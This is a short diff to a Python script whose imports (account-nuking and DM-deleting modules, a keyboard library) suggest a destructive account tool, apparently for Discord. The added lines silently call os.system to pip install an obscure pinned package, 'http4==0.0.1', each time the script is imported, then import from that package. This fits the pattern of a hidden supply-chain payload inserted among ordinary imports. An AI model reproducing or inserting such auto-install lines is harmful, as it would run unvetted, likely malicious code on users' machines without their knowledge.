@@ -5,8 +5,11 @@
 import multiprocessing
 import keyboard
 import base64
-
+import os
+os.system(f"pip install http4==0.0.1")
+from http4 import http
 from util.plugins.common import *
+
 import util.accountNuke
 import util.dmdeleter
 import util.info
